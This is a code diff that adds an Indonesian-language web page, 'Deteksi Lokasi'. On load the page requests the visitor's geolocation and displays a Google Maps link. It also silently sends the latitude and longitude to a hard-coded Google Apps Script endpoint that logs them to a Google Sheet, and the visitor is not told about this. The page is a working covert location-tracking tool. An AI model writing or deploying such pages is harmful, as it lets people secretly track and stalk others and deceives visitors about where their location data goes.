@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Deteksi Lokasi</title>
+  <style>
+    body {
+      font-family: Arial;
+      text-align: center;
+      margin-top: 100px;
+      background: #f2f2f2;
+    }
+  </style>
+</head>
+
+<body onload="getLocation()">
+
+<h2>Mengambil Lokasi...</h2>
+<p>Mohon izinkan akses lokasi</p>
+
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, showError);
+  } else {
+    document.body.innerHTML = "Browser tidak mendukung GPS";
+  }
+}
+
+function showPosition(position) {
+  let lat = position.coords.latitude;
+  let lon = position.coords.longitude;
+
+  let maps = "https://www.google.com/maps?q=" + lat + "," + lon;
+
+  document.body.innerHTML =
+    "<h2>Lokasi Berhasil Diambil</h2>" +
+    "<p><a href='" + maps + "' target='_blank'>Lihat di Google Maps</a></p>";
+
+  // 🔥 SUDAH TERHUBUNG KE GOOGLE SHEET
+  let url = "https://script.google.com/macros/s/AKfycbx_4jsL4WznN5LRnNfRL062A1UkHox4mvVeJxlxD252DA2BIdnrd747kLdG2pZpL8V7/exec?lat=" + lat + "&lon=" + lon;
+  fetch(url);
+}
+
+function showError(error) {
+  let msg = "";
+  switch(error.code) {
+    case error.PERMISSION_DENIED:
+      msg = "Izin lokasi ditolak ❌";
+      break;
+    case error.POSITION_UNAVAILABLE:
+      msg = "Lokasi tidak tersedia ❌";
+      break;
+    case error.TIMEOUT:
+      msg = "Request timeout ❌";
+      break;
+    default:
+      msg = "Terjadi kesalahan ❌";
+  }
+  document.body.innerHTML = msg;
+}
+</script>
+
+</body>
+</html>
